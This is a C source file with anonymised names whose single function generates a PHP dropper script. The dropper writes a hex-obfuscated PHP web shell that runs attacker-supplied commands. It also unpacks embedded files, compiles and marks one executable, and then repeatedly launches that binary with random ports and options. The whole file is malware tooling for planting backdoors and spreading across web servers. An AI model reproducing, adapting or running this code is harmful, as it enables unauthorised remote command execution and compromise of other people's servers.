
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 char* VAR_0 ;
 char* VAR_1 ;
 char* VAR_2 ;
 char* VAR_3 ;
 char* VAR_4 ;
 char* VAR_5 ;
 char* VAR_6 ;
 char* VAR_7 ;
 char* VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int FUNC_0 (int *) ;
 int * FUNC_1 (char*,char*) ;
 int FUNC_2 (int *,char*,...) ;
 scalar_t__ FUNC_3 (unsigned long*,int,int,int *) ;

int FUNC_4()
{
 unsigned long VAR_11=0;
 FILE *VAR_12;
 FILE *VAR_13;

 if((VAR_12=FUNC_1(VAR_1,"w"))==((void*)0))
 {
  return(-1);
 }

 FUNC_2(VAR_12,"<?\n"
  "chdir('../../');\n\n"
  "if(($fp=fopen('%s','r'))!=NULL)\n"
  "{\n"
  "$pnum=fread($fp,32);\n"
  "fclose($fp);\n"
  "$pnum=str_replace(\"\\n\",\"\",$pnum);\n"
  "if(($fp=fopen('/proc/'.$pnum.'/stat','r'))!=NULL)\n"
  "{\n"
  "exit;\n"
  "}\n"
  "}\n\n"
  "$cont=\"\\x3c\\x3f\\x0a\\x09\\x65\\x63\\x68\\x6f\\x20\\x27\\x3c\\x46\".\n"
  "\"\\x4f\\x52\\x4d\\x20\\x41\\x43\\x54\\x49\\x4f\\x4e\\x3d\\x24\".\n"
  "\"\\x50\\x48\\x50\\x5f\\x53\\x45\\x4c\\x46\\x20\\x4d\\x45\\x54\".\n"
  "\"\\x48\\x4f\\x44\\x3d\\x50\\x4f\\x53\\x54\\x3e\\x27\\x3b\\x0a\".\n"
  "\"\\x09\\x65\\x63\\x68\\x6f\\x20\\x27\\x3c\\x49\\x4e\\x50\\x55\".\n"
  "\"\\x54\\x20\\x54\\x59\\x50\\x45\\x3d\\x48\\x49\\x44\\x44\\x45\".\n"
  "\"\\x4e\\x20\\x4e\\x41\\x4d\\x45\\x3d\\x63\\x6d\\x64\\x20\\x56\".\n"
  "\"\\x41\\x4c\\x55\\x45\\x3d\\x24\\x63\\x6f\\x6d\\x6d\\x61\\x6e\".\n"
  "\"\\x64\\x3e\\x3c\\x2f\\x46\\x4f\\x52\\x4d\\x3e\\x3c\\x50\\x52\".\n"
  "\"\\x45\\x3e\\x27\\x3b\\x0a\\x09\\x24\\x63\\x6f\\x6d\\x6d\\x61\".\n"
  "\"\\x6e\\x64\\x3d\\x73\\x74\\x72\\x5f\\x72\\x65\\x70\\x6c\\x61\".\n"
  "\"\\x63\\x65\\x28\\x27\\x5c\\x5c\\x27\\x2c\\x27\\x27\\x2c\\x24\".\n"
  "\"\\x63\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x29\\x3b\\x0a\\x09\\x65\".\n"
  "\"\\x63\\x68\\x6f\\x20\\x60\\x24\\x63\\x6f\\x6d\\x6d\\x61\\x6e\".\n"
  "\"\\x64\\x60\\x3b\\x0a\\x3f\\x3e\\x0a\";\n\n"
  "$fp=fopen('%s','w');\n"
  "fputs($fp,$cont);\n"
  "fclose($fp);\n\n",VAR_8,VAR_0);

 if((VAR_13=FUNC_1(VAR_2,"r"))==((void*)0))
 {
  return(-1);
 }

 FUNC_2(VAR_12,"$cont=\"");
 while(FUNC_3(&VAR_11,1,1,VAR_13))
 {
  FUNC_2(VAR_12,"\\x%02x",VAR_11);
 }
 FUNC_0(VAR_13);
 FUNC_2(VAR_12,"\";\n\n");

 FUNC_2(VAR_12,"$fp=fopen('%s','w');\n"
  "fputs($fp,$cont);\n"
  "fclose($fp);\n\n",VAR_2);
 if((VAR_13=FUNC_1(VAR_3,"r"))==((void*)0))
 {
  return(-1);
 }
 FUNC_2(VAR_12,"$cont=\"");
 while(FUNC_3(&VAR_11,1,1,VAR_13))
 {
  FUNC_2(VAR_12,"\\x%02x",VAR_11);
 }
 FUNC_0(VAR_13);
 FUNC_2(VAR_12,"\";\n\n");

 FUNC_2(VAR_12,"$fp=fopen('%s','w');\n"
  "fputs($fp,$cont);\n"
  "fclose($fp);\n\n",VAR_3);
 FUNC_2(VAR_12,"$RES=`gcc -o %s %s`;\n\n",VAR_2,VAR_3);

 FUNC_2(VAR_12,"chmod('%s',0755);\n",VAR_2);

 FUNC_2(VAR_12,"if(($fp=fopen('%s','r'))!=NULL){\n",VAR_0);
 FUNC_2(VAR_12,"echo \"%s\\n\";\n",VAR_6);
 FUNC_2(VAR_12,"} fclose($fp);\n\n");
 FUNC_2(VAR_12,"if(($fp=fopen('%s','r'))!=NULL){\n",VAR_2);
 FUNC_2(VAR_12,"echo \"%s\\n\";\n",VAR_7);
 FUNC_2(VAR_12,"} fclose($fp);\n\n");


 FUNC_2(VAR_12,"$fnum=(rand()%%%d);\n",VAR_10);
 FUNC_2(VAR_12,"$snum=(rand()%%%d);\n",VAR_9);
 FUNC_2(VAR_12,"$randnum=(rand()%400);\n");

 FUNC_2(VAR_12,"while(1)\n{\n");
 FUNC_2(VAR_12,"if(($fp=fopen('%s','r'))!=NULL)\n"
  "{\n"
  "$pnum=fread($fp,32);\n"
  "fclose($fp);\n"
  "$pnum=str_replace(\"\\n\",\"\",$pnum);\n"
  "if(($fp=fopen('/proc/'.$pnum.'/stat','r'))!=NULL)\n"
  "{\n"
  "exit;\n"
  "}\n"
  "}\n\n",VAR_8);

 FUNC_2(VAR_12,"$port=(rand()%%65500);\n");
 FUNC_2(VAR_12,"if($port>1024){\n");
 FUNC_2(VAR_12,"exec(\"./%s -t $fnum -p $port -s $snum -q $randnum\");\n",VAR_2);
 FUNC_2(VAR_12,"}\n}\n");
 FUNC_2(VAR_12,"?>\n");
 FUNC_0(VAR_12);
}
